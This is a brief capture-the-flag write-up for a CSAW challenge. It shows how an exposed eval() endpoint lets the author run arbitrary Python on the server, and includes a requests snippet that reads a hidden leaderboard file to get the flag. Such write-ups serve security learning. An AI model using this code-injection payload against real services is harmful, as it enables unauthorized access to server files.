## Playing on the Backcourts Write-up
By Minsuh (Endeavy)

1. Download the source code (app_public.py)
2. At first, I noticed that there is special page (/get_eval) where we can specify the input for eval().
3. Also, I thought safetytime variable was the flag, but it wasn't.
So, I look for hidden sfutff. And, I find out that we cannot access leaderboard unless if we get special cookie.
4. With eval(), we can extract hidden value.
```Python
import requests

res = requests.post("https://backcourts.ctf.csaw.io/get_eval", {"expr": "open(leaderboard_path, 'r').read()"})
print(res.text)
```
In the leaderboard, there was a flag.